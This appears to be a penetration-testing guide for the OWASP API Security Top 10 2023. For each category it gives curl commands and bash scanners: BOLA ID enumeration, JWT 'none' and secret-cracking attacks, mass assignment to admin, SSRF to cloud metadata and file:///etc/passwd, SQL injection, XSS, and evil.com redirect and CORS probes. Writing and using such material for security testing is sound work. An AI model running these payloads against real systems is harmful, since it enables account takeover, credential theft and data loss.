# OWASP API Security Top 10 2023 — Detailed Test Cases

> *"Every API has secrets. Systematic testing reveals them all."*

## API1:2023 — Broken Object Level Authorization (BOLA)

### Description
APIs expose endpoints that handle object identifiers, creating a wide attack surface for Object Level Access Control issues.

### Test Cases

#### Sequential ID Testing
```bash
# Test with sequential IDs
curl "$TARGET/api/v1/users/1" -H "Authorization: Bearer $USER_TOKEN"
curl "$TARGET/api/v1/users/2" -H "Authorization: Bearer $USER_TOKEN"
curl "$TARGET/api/v1/users/3" -H "Authorization: Bearer $USER_TOKEN"

# Test with orders/documents
curl "$TARGET/api/v1/orders/1001" -H "Authorization: Bearer $USER_TOKEN"
curl "$TARGET/api/v1/documents/doc-001" -H "Authorization: Bearer $USER_TOKEN"
```

#### UUID Manipulation
```bash
# If using UUIDs, try to access other users' resources
curl "$TARGET/api/v1/users/550e8400-e29b-41d4-a716-446655440000"
curl "$TARGET/api/v1/users/550e8400-e29b-41d4-a716-446655440001"

# Try predictable UUID patterns
```

#### Nested Object Access
```bash
# Access nested resources
curl "$TARGET/api/v1/users/1/orders/1"
curl "$TARGET/api/v1/users/2/orders/1"  # Access user 2's orders as user 1
curl "$TARGET/api/v1/organizations/1/users/1/reports/1"
```

#### Bulk Operations
```bash
# Test bulk endpoints
curl "$TARGET/api/v1/users/bulk?ids=1,2,3,4,5"
curl -X POST "$TARGET/api/v1/users/export" -d '{"user_ids": [1,2,3,4,5]}'
```

### Automated Testing
```bash
#!/bin/bash
# bola_scanner.sh
for id in $(seq 1 100); do
    response=$(curl -s "$TARGET/api/v1/users/$id" -H "Authorization: Bearer $TOKEN")
    if echo "$response" | grep -q '"id"'; then
        echo "[BOLA] Accessed user $id"
        echo "$response" | jq .
    fi
done
```

---

## API2:2023 — Broken Authentication

### Description
Authentication mechanisms are often implemented incorrectly, allowing attackers to compromise authentication tokens.

### Test Cases

#### JWT Vulnerabilities
```bash
# None algorithm attack
# Original: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U
# Modified header: {"alg":"none","typ":"JWT"}
# Remove signature

# Test null signature
curl "$TARGET/api/v1/users" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9."

# Weak secret cracking
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Algorithm confusion (RS256 to HS256)
python3 jwt_tool.py $JWT -X k -pk public.pem
```

#### Token Expiration Testing
```bash
# Use expired token
curl "$TARGET/api/v1/users" -H "Authorization: Bearer $EXPIRED_TOKEN"

# Test if expiration is enforced
# Modify 'exp' claim to future date
```

#### Refresh Token Abuse
```bash
# Reuse refresh token after rotation
curl -X POST "$TARGET/api/v1/auth/refresh" -d '{"refresh_token": "$OLD_REFRESH_TOKEN"}'

# Test refresh token lifetime
# Test refresh token revocation
```

#### Password Reset Flow
```bash
# Test for weak reset tokens
curl -X POST "$TARGET/api/v1/auth/forgot-password" -d '{"email": "victim@test.com"}'

# Try to predict reset token
# Test if token is single-use
curl -X POST "$TARGET/api/v1/auth/reset-password" -d '{"token": "$RESET_TOKEN", "password": "newpass"}'
curl -X POST "$TARGET/api/v1/auth/reset-password" -d '{"token": "$RESET_TOKEN", "password": "anotherpass"}'
```

#### Credential Stuffing Protection
```bash
# Test rate limiting on login
for i in {1..100}; do
    curl -X POST "$TARGET/api/v1/auth/login" \
        -d '{"email": "test@test.com", "password": "wrong'$i'"}'
done
```

---

## API3:2023 — Broken Object Property Level Authorization

### Description
Combines Excessive Data Exposure and Mass Assignment vulnerabilities.

### Test Cases

#### Excessive Data Exposure
```bash
# Check response for sensitive fields
curl "$TARGET/api/v1/users/me" -H "Authorization: Bearer $TOKEN" | jq .

# Look for: password_hash, ssn, credit_card, internal_id, admin_flag, etc.
```

#### Mass Assignment
```bash
# Try to set unauthorized fields
curl -X PUT "$TARGET/api/v1/users/me" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"name": "Test", "role": "admin"}'

curl -X PUT "$TARGET/api/v1/users/me" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"name": "Test", "is_admin": true}'

curl -X PUT "$TARGET/api/v1/users/me" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"name": "Test", "balance": 999999}'

# Try nested objects
curl -X PUT "$TARGET/api/v1/users/me" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"name": "Test", "permissions": {"admin": true}}'
```

#### Property Pollution
```bash
# Add unexpected properties
curl -X POST "$TARGET/api/v1/orders" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"product_id": 1, "quantity": 1, "price": 0.01, "discount": 100}'
```

---

## API4:2023 — Unrestricted Resource Consumption

### Description
API requests consume resources such as network bandwidth, CPU, memory, and storage.

### Test Cases

#### Rate Limit Testing
```bash
#!/bin/bash
# Test requests per second
for i in {1..1000}; do
    curl -s -o /dev/null -w "%{http_code}\n" "$TARGET/api/v1/users" &
done
wait
```

#### Pagination Abuse
```bash
# Request excessive page sizes
curl "$TARGET/api/v1/users?page=1&limit=10000"
curl "$TARGET/api/v1/users?page=1&per_page=999999"

# Test offset limits
curl "$TARGET/api/v1/users?offset=999999999"
```

#### GraphQL DoS
```graphql
# Deep nested query
query {
  users {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}

# Batch query attack
query {
  user1: user(id: "1") { data }
  user2: user(id: "2") { data }
  # ... repeat 1000 times
  user1000: user(id: "1000") { data }
}

# Alias attack
query {
  a1: expensiveQuery
  a2: expensiveQuery
  a3: expensiveQuery
  # ... repeat many times
}
```

#### File Upload Size
```bash
# Test upload size limits
dd if=/dev/zero of=large_file.bin bs=1M count=1000
curl -X POST "$TARGET/api/v1/upload" -F "file=@large_file.bin"
```

---

## API5:2023 — Broken Function Level Authorization (BFLA)

### Description
Complex access control policies with different hierarchies, groups, and roles.

### Test Cases

#### Admin Endpoint Access
```bash
# Access admin endpoints as regular user
curl "$TARGET/api/v1/admin/users" -H "Authorization: Bearer $USER_TOKEN"
curl "$TARGET/api/v1/admin/settings" -H "Authorization: Bearer $USER_TOKEN"
curl -X DELETE "$TARGET/api/v1/admin/users/1" -H "Authorization: Bearer $USER_TOKEN"
```

#### HTTP Method Tampering
```bash
# Try different HTTP methods
curl -X GET "$TARGET/api/v1/users/1" -H "Authorization: Bearer $TOKEN"    # Read
curl -X PUT "$TARGET/api/v1/users/1" -H "Authorization: Bearer $TOKEN"    # Update
curl -X DELETE "$TARGET/api/v1/users/1" -H "Authorization: Bearer $TOKEN" # Delete
curl -X PATCH "$TARGET/api/v1/users/1" -H "Authorization: Bearer $TOKEN"  # Partial update

# Test if read-only user can write
curl -X POST "$TARGET/api/v1/reports" \
    -H "Authorization: Bearer $READONLY_TOKEN" \
    -d '{"title": "Test"}'
```

#### Endpoint Path Manipulation
```bash
# Try path variations
curl "$TARGET/api/v1/users"
curl "$TARGET/api/admin/users"
curl "$TARGET/api/internal/users"
curl "$TARGET/api/v2/users"
curl "$TARGET/api/beta/users"
curl "$TARGET/api/debug/users"
```

---

## API6:2023 — Unrestricted Access to Sensitive Business Flows

### Description
Exposing a business flow without compensating controls.

### Test Cases

#### Automation Abuse
```bash
# Automate purchase flow
for i in {1..100}; do
    curl -X POST "$TARGET/api/v1/purchase" \
        -H "Authorization: Bearer $TOKEN" \
        -d '{"item_id": "limited_edition"}'
done
```

#### Business Logic Bypass
```bash
# Skip required steps
# Instead of: step1 -> step2 -> step3
curl -X POST "$TARGET/api/v1/checkout/complete" -d '{"order_id": 1}'

# Test negative values
curl -X POST "$TARGET/api/v1/transfer" -d '{"amount": -1000, "to": "attacker"}'

# Test boundary values
curl -X POST "$TARGET/api/v1/purchase" -d '{"quantity": 0}'
curl -X POST "$TARGET/api/v1/purchase" -d '{"quantity": 999999999}'
```

#### Race Conditions
```bash
#!/bin/bash
# Test race condition on coupon redemption
for i in {1..50}; do
    curl -X POST "$TARGET/api/v1/redeem" \
        -H "Authorization: Bearer $TOKEN" \
        -d '{"coupon": "ONEUSE"}' &
done
wait
```

---

## API7:2023 — Server Side Request Forgery (SSRF)

### Description
SSRF flaws occur when an API fetches a remote resource without validating the user-supplied URL.

### Test Cases

```bash
# Internal network scanning
curl -X POST "$TARGET/api/v1/fetch" -d '{"url": "http://127.0.0.1:22"}'
curl -X POST "$TARGET/api/v1/fetch" -d '{"url": "http://192.168.1.1"}'
curl -X POST "$TARGET/api/v1/fetch" -d '{"url": "http://10.0.0.1"}'

# Cloud metadata access
curl -X POST "$TARGET/api/v1/fetch" -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
curl -X POST "$TARGET/api/v1/fetch" -d '{"url": "http://169.254.169.254/latest/user-data/"}'

# Azure metadata
curl -X POST "$TARGET/api/v1/fetch" -d '{"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}'

# GCP metadata
curl -X POST "$TARGET/api/v1/fetch" -d '{"url": "http://metadata.google.internal/computeMetadata/v1/"}'

# Protocol smuggling
curl -X POST "$TARGET/api/v1/fetch" -d '{"url": "file:///etc/passwd"}'
curl -X POST "$TARGET/api/v1/fetch" -d '{"url": "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING"}'

# Bypass techniques
curl -X POST "$TARGET/api/v1/fetch" -d '{"url": "http://127.0.0.1.nip.io"}'
curl -X POST "$TARGET/api/v1/fetch" -d '{"url": "http://0x7f000001"}'
curl -X POST "$TARGET/api/v1/fetch" -d '{"url": "http://2130706433"}'
```

---

## API8:2023 — Security Misconfiguration

### Description
API and supporting infrastructure misconfiguration.

### Test Cases

#### CORS Testing
```bash
# Test CORS headers
curl -H "Origin: http://evil.com" -I "$TARGET/api/v1/users"
curl -H "Origin: null" -I "$TARGET/api/v1/users"

# Check for wildcard
# Access-Control-Allow-Origin: * is dangerous with credentials
```

#### Verbose Errors
```bash
# Trigger detailed errors
curl "$TARGET/api/v1/users/invalid'"
curl "$TARGET/api/v1/users/-1"
curl "$TARGET/api/v1/users/null"

# Look for stack traces, SQL errors, framework info
```

#### Debug Endpoints
```bash
# Check for debug functionality
curl "$TARGET/api/debug"
curl "$TARGET/api/v1/debug"
curl "$TARGET/api/health"
curl "$TARGET/api/status"
curl "$TARGET/api/metrics"
curl "$TARGET/api/env"
curl "$TARGET/api/config"
```

#### Security Headers
```bash
# Check response headers
curl -I "$TARGET/api/v1/users"

# Should have:
# - Strict-Transport-Security
# - X-Content-Type-Options
# - X-Frame-Options
# - Content-Security-Policy
```

---

## API9:2023 — Improper Inventory Management

### Description
APIs tend to expose more endpoints than traditional web applications.

### Test Cases

#### Find Undocumented Endpoints
```bash
# Fuzz for hidden endpoints
ffuf -u "$TARGET/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Try common hidden paths
curl "$TARGET/api/internal/users"
curl "$TARGET/api/admin/config"
curl "$TARGET/api/debug/logs"
curl "$TARGET/api/test/users"
curl "$TARGET/api/staging/users"
```

#### API Version Discovery
```bash
# Test multiple versions
for v in v1 v2 v3 v4 beta alpha internal legacy deprecated; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/$v/users")
    echo "API version $v: $response"
done
```

#### Shadow API Discovery
```bash
# Check for different API paths
curl "$TARGET/api/users"
curl "$TARGET/v1/users"
curl "$TARGET/rest/users"
curl "$TARGET/graphql"
curl "$TARGET/api-gateway/users"
```

---

## API10:2023 — Unsafe Consumption of APIs

### Description
Developers trust data from third-party APIs without validation.

### Test Cases

#### Webhook Payload Injection
```bash
# If application accepts webhooks, inject malicious data
curl -X POST "$TARGET/api/v1/webhook" \
    -H "Content-Type: application/json" \
    -d '{"event": "payment", "data": {"amount": "<script>alert(1)</script>"}}'

# SQL injection via webhook
curl -X POST "$TARGET/api/v1/webhook" \
    -d '{"user_id": "1; DROP TABLE users;--"}'
```

#### Redirect Manipulation
```bash
# Test redirect URL parameters
curl "$TARGET/api/v1/oauth/callback?redirect_uri=http://evil.com"
curl "$TARGET/api/v1/login?next=http://evil.com"
```

---

## Quick Reference Testing Script

```bash
#!/bin/bash
# api_quick_test.sh - Quick OWASP API Top 10 tests

TARGET=$1
TOKEN=$2

echo "=== OWASP API Security Quick Test ==="
echo "Target: $TARGET"

echo -e "\n[API1] BOLA Test"
for i in 1 2 3; do
    curl -s "$TARGET/api/v1/users/$i" -H "Authorization: Bearer $TOKEN" | jq -r '.id // "N/A"'
done

echo -e "\n[API3] Mass Assignment Test"
curl -s -X PUT "$TARGET/api/v1/users/me" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"role": "admin"}' | jq .

echo -e "\n[API5] Admin Endpoint Test"
curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/v1/admin/users" -H "Authorization: Bearer $TOKEN"

echo -e "\n[API8] CORS Test"
curl -s -I -H "Origin: http://evil.com" "$TARGET/api/v1/users" | grep -i "access-control"

echo -e "\n[API9] Version Discovery"
for v in v1 v2 v3 internal; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/$v/users")
    echo "$v: $code"
done

echo -e "\n=== Test Complete ==="
```
